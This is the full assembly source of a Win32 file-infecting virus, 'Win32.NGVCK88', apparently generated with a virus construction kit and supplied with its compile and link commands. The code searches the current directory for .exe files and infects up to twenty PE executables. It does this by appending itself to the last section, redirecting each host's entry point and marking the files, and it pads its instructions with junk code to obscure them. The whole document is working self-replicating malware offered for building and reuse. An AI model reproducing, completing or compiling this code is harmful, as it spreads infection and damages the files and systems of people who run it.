              
;
;
; Win32.NGVCK88 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK88
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 39
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
                                        ; add esp, 4
 add esp, 4d
 mov ecx, dword ptr [esp-4]
                                        ; mov ebp, ecx
                                        ; clear ebp
 xor ebp, ebp
 add ebp, ecx
 jmp KernelSearchStart
 rol ecx, 24d                           ; Trash


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear edx
 mov edx, 45499d
 sub edx, 45499d
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 mov edi, ebp
 add edi, offset APIOffsets

 lea ebx, [ebp+APINames]


GetApisLoop: 

                                        ; search 'em
                                        ; ebx points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add ebx, 4
 add ebx, 4d
 add dword ptr [ebp+Trash1], 1465260    ; Trash
 push dword ptr [ebp+TempAPI]
 pop ecx
 mov dword ptr [edi], 0
 add dword ptr [edi], ecx
                                        ; add edi, 4
 inc edi
 add edi, 3d
 dec edx
 jnz GetApisLoop
 lea ecx, [ebp+Outbreak]

 push ecx
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov eax, 128
 mov eax, ( 128d - 36d )
 add eax, 36d
 push eax
 mov eax, offset WFD_szFileName
 add eax, ebp


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 dec eax
 inc eax
 jz NoInfection
 and ecx, 83348421d                     ; Trash
                                        ; check for minimum filesize
 lea eax, [ebp+WFD_nFileSizeLow]
 xchg ebx, eax

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je Goodfile
                                        ; mov ecx, 10071
 mov ecx, ( 10071d + 37d )
 sub ecx, 37d
 cmp ecx, 10071d
 je Notagoodfile

Goodfile:
                                        ; clear ebx
 and ebx, 0
 mov bx, word ptr [edx+3Ch]
 or ebx, ebx
 jz Notagoodfile
                                        ; clear ecx
 mov ecx, 0
 add ecx, dword ptr [edx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, edx
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [ecx]
 cmp eax, 'EP'
 je Goodfile2
                                        ; clear ebx
 mov ebx, 0
 or ebx, ebx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov ax, word ptr [ecx+16h]
 and ax, 0F000h
 dec ebx                                ; Trash
 cmp ax, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov eax, dword ptr [ebp+Attributes]
 push eax
 lea esi, [ebp+WFD_szFileName]
 xchg eax, esi

 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

 shl edx, 10d                           ; Trash
NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop eax

 push eax
 pop dword ptr [ebp+retEIP]

                                        ; mov edi, -1
 mov edi, -1d
 and edi, dword ptr [ebp+OldBase]

 push edi
 pop dword ptr [ebp+retBase]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 inc ebp
 dec ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 push ebx
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ecx, [ebp+filemask]
 xchg ebx, ecx

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 or ecx, ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; mov edi, -1
 mov edi, 0
 add edi, -1d
 and edi, dword ptr [ebp+FindHandle]
 push edi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 mov ecx, ( 276d xor 26d )
 xor ecx, 26d
 lea eax, [ebp+WFD_szFileName]
 xchg eax, edx


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 sub edx, -1d
 dec ecx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov esi, offset WIN32_FIND_DATA
 add esi, ebp

 push esi
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov ebx, ebp
 add ebx, offset WIN32_FIND_DATA

 push ebx
                                        ; clear edx
 xor edx, edx
 xor edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret





;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 mov edx, -63816d
 add edx, 63816d

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 inc edx
 push edx
 push 80000000h or 40000000h
 lea eax, [ebp+WFD_szFileName]
 xchg eax, esi

 push esi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax
 inc dword ptr [ebp+Trash1]             ; Trash

CreateMap:                              ; Map the file
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 push ebx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 test eax, eax
 jz CloseFile
 push ebx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 mov eax, ( -1d + 21d )
 sub eax, 21d
 and eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]

 push dword ptr [ebp+OldBase]
 pop eax

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], eax


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov eax, dword ptr [esp]
                                        ; round to pages
 xor ax, ax
                                        ; add eax, 1
 add eax, 1d
GetKernelLoop:
                                        ; clear ecx
 sub ecx, ecx
 dec eax
 mov cx, word ptr [eax+03ch]
 cmp cx,0f800h
 je GetKernelLoop
 cmp eax, dword ptr [eax+ecx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], eax
 mov ecx, eax
 add ecx, [eax+3Ch]
 mov [KernelPE+ebp], ecx

 jmp GetApis

;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 and word ptr [ebp+counter], 0h



                                        ; clear ecx
 mov ecx, -12927d
 add ecx, 12927d
 add ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edx
 push 0
 pop edx
 add edx, [ecx+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; add edx, 4
 dec edx
 add edx, 5d
                                        ; get NTableVA
 mov ecx, dword ptr [edx]
                                        ; add edx, 4
 add edx, 4d
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; get OTableVA
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 push dword ptr [ebp+KernelMZ]
 pop ecx
 add ecx, dword ptr [eax]
                                        ; mov eax, ecx
 push ecx
 pop eax
                                        ; mov edi, eax
 push eax
 pop edi
 mov dword ptr [ebp+TempApisearch2], 0
 xor dword ptr [ebp+TempApisearch2], edi
 mov dword ptr [ebp+TempApisearch3], ebx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 mov ecx, dword ptr [ebx]
 LoopChsksm:
                                        ; clear edx
 mov edx, 0
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 shl dx,8d
 sub ecx, edx
 test dx, dx
 jz LoopConti
                                        ; clear edx
 mov edx, 62996d
 sub edx, 62996d
 mov dl, byte ptr [edi]
 sub ecx, edx
                                        ; add edi, 1
 add edi, 1d
 or dx, dx
 jnz LoopChsksm
LoopConti:
 add ecx, -1
 inc ecx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop eax
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+TempApisearch3]
                                        ; mov edi, -1
 mov edi, -1d
 and edi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 dec eax
 add eax, 5d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2002h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 push ecx
 pop edi
 movzx ecx, word ptr [edi]
 sal ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ecx]
 xor dword ptr [ebp+Trash1], 1762389    ; Trash
 add eax, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ecx
 mov ecx, 28454d
 sub ecx, 28454d
 xor ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [ecx+3Ch]
 add esi, ecx
                                        ; get File Alignment
                                        ; add esi, 60
 add esi, 60d
 mov ecx, [esi]
 dec esi
 sub esi, 59d
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ecx
 add ebx, VirusSize
 push ebx
 pop dword ptr [ebp+AlignReg1]
 call Align
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 push ebx
 pop dword ptr [ebp+NewSize]
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
                                        ; clear esi
 sub esi, esi
 xor esi, dword ptr [ebp+MapAddress]
 sub eax, 36475543d                     ; Trash
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
                                        ; clear esi
 mov esi, 0
 add esi, ecx
                                        ; get last section
                                        ; clear ebx
 mov ebx, 54378d
 sub ebx, 54378d
 mov bx, word ptr [esi+06h]
 add ebx, -1
 xor edx, eax                           ; Trash
 imul ebx, ebx, 28h
                                        ; add ecx, 120
 dec ecx
 add ecx, 121d
 add ecx, ebx
 mov edx, dword ptr [esi+74h]
 sal edx, 3
 add ecx, edx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], ebx
                                        ; clear ebx
 sub ebx, ebx

 add ebx, [ecx+10h]
                                        ; mov edx, ebx
 mov edx, ebx
 add ecx, 14h
 add ebx, [ecx]
 sub ecx, 14h
 push ebx
 mov eax, edx
 add eax, [ecx+0Ch]
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
                                        ; clear eax
 push 0
 pop eax

 add eax, [ecx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add eax, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [ecx+08h], eax
 mov eax, dword ptr [ecx+10h]
 add eax, dword ptr [ecx+0Ch]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov ecx, VirusSize
 lea eax, [ebp+Virus]
 xchg eax, esi

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+InfCounter]
 dec eax
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 filemask    db '*.exe',0

 APIOffsets:
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XGetFileAttributesA    dd 0h
 XSetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h

 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 AlignReg2   dd 0h
 InfCounter  dd 0h
 ATableVA    dd 0h
 OldEIP      dd 0h
 MapHandle   dd 0h
 FileHandle  dd 0h
 db 'Win32.NGVCK88 by SnakeByte',0
 TempApisearch3 dd 0h
 TempApisearch2 dd 0h
 AlignReg1   dd 0h
 NewEIP      dd 0h
 Attributes  dd 0h
 TempAPI     dd 0h
 KernelMZ    dd 0h
 MapAddress  dd 0h
 NewSize     dd 0h
 FindHandle  dd 0h
 OldBase     dd 400000h
 counter     dw 0h
 KernelPE    dd 0h
 OTableVA    dd 0h
 Trash1      dd 0h

 APINames:
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h

 NTableVA    dd 0h




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

